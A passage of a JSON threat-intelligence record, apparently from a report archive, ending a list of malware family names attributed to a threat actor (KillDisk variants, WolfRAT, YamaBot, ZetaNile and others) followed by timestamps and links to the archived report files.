                "Win32/KillDisk.NBC",
                "Win32/KillDisk.NBD",
                "Win32/KillDisk.NBH",
                "Win32/KillDisk.NBI",
                "WinorDLL64",
                "Winsec",
                "WolfRAT",
                "Wormhole",
                "YamaBot",
                "Yort",
                "ZetaNile",
                "concealment_troy",
                "http_troy",
                "httpdr0pper",
                "httpdropper",
                "klovbot",
                "sRDI"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535551,
    "ts_updated_at": 1743041843,
    "ts_creation_date": 1664712078,
    "ts_modification_date": 1664712078,
    "files": {
        "pdf": "https://archive.orkl.eu/0e7de0ca11dd14fd9036563facec0b37fd6026b2.pdf",
        "text": "https://archive.orkl.eu/0e7de0ca11dd14fd9036563facec0b37fd6026b2.txt",
        "img": "https://archive.orkl.eu/0e7de0ca11dd14fd9036563facec0b37fd6026b2.jpg"
    }
}